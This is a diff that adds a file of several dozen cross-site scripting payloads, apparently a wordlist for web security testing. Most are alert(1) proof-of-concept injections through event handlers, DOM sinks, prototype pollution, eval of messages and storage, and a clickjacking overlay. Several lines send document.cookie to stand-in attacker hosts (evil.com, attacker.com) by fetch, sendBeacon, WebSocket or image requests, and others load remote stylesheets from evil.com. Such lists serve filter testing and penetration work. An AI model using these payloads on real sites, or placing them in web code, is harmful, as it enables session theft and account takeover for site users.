@@ -1,0 +1,68 @@
+<script>document.write("<img src=x onerror=alert(1)>")</script>
+<script>document.body.innerHTML="<img src=x onerror=alert(1)>"</script>
+<script>document.currentScript.insertAdjacentHTML("afterend","<img src=x onerror=alert(1)>")</script>
+<script>document.head.appendChild(Object.assign(document.createElement("script"),{text:"alert(1)"}))</script>
+<meta http-equiv=refresh content=0;url=javascript:alert(1)>
+<meta http-equiv=refresh content='0;url=javascript:alert(1)'>
+<base href=javascript:alert(1)//><a href=/x>click</a>
+<base target=_blank><a href=x onclick=eval(name)>x</a>
+<script type=module>import "data:text/javascript,alert(1)"</script>
+<script>import("data:text/javascript,alert(1)")</script>
+<img src=x onerror=import("data:text/javascript,alert(1)")>
+<script>window.addEventListener("message",function(e){eval(e.data)})</script>
+<script>window.opener.postMessage("<img src=x onerror=alert(1)>","*")</script>
+__proto__[innerHTML]=<img src=x onerror=alert(1)>
+constructor.prototype.innerHTML=<img src=x onerror=alert(1)>
+__proto__[src]=x&__proto__[onerror]=alert(1)
+<script>new MutationObserver(function(){alert(1)}).observe(document.body,{childList:true})</script><img src=x onerror=document.body.appendChild(document.createElement("x"))>
+<script>new IntersectionObserver(function(){alert(1)}).observe(document.body)</script>
+<script>new ResizeObserver(function(){alert(1)}).observe(document.body)</script>
+<script>async function x(){alert(await Promise.resolve(1))}x()</script>
+<script>(async()=>alert(await 1))()</script>
+<script>function* g(){yield alert(1)}g().next()</script>
+<script>fetch("//evil.com",{method:"POST",body:document.cookie})</script>
+<script>navigator.sendBeacon("//evil.com",document.cookie)</script>
+<script>new WebSocket("wss://evil.com").onopen=function(){this.send(document.cookie)}</script>
+<script>new Image().src="//attacker.com/?c="+encodeURIComponent(document.cookie)</script>
+<script>const x=new Proxy({},{get:()=>alert(1)});x.y</script>
+<script>Reflect.apply(alert,[null,[1]])</script>
+<script>Reflect.construct(Function,["alert(1)"])()</script>
+<script>window.addEventListener("unhandledrejection",function(){alert(1)});Promise.reject()</script>
+<script>window.addEventListener("error",function(){alert(1)});null.x</script>
+<script>try{}catch(e){}finally{alert(1)}</script>
+<script>({get[Symbol.toPrimitive](){alert(1)}})+""</script>
+<script>new Proxy({},{get(){alert(1)}}).__proto__</script>
+<img src=x onerror=1&&alert(1)>
+<img src=x onerror=0||alert(1)>
+<img src=x onerror=null??alert(1)>
+<img src=x onerror=alert?.(1)>
+<img src=x onerror=(0,alert)(1)>
+<img src=x onerror=a=alert,a(1)>
+<img src=x onerror=(a=alert)(1)>
+<img src=x onerror=!alert(1)>
+<img src=x onerror=~alert(1)>
+<img src=x onerror=+alert(1)>
+<img src=x onerror=void(alert(1))>
+<img src=x onerror=typeof alert(1)>
+alert(1)//
+alert(1);
+/**/ alert(1) /**/
+(alert)(1)
+alert.call(this,1)
+alert.apply(this,[1])
+alert.bind(this)(1)
+window['alert'](1)
+self['alert'](1)
+top['alert'](1)
+<img id=x><script>alert(x.src)</script>
+<a id=x href=javascript:alert(1)><script>x.click()</script>
+<form id=x action=javascript:alert(1)><script>x.submit()</script>
+<script>localStorage.setItem("x","<img src=x onerror=alert(1)>");document.write(localStorage.getItem("x"))</script>
+<script>sessionStorage.setItem("x","alert(1)");eval(sessionStorage.getItem("x"))</script>
+<script>var bc=new BroadcastChannel("x");bc.onmessage=function(e){eval(e.data)};bc.postMessage("alert(1)")</script>
+<script>var mc=new MessageChannel();mc.port1.onmessage=function(e){eval(e.data)};mc.port2.postMessage("alert(1)")</script>
+<div style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:0 onclick=alert(1)></div>
+<img src=x loading=lazy onerror=alert(1)>
+<template shadowroot=open><img src=x onerror=alert(1)></template>
+<style>@import url("//evil.com/xss.css");</style>
+<link rel=stylesheet href=//evil.com/xss.css>
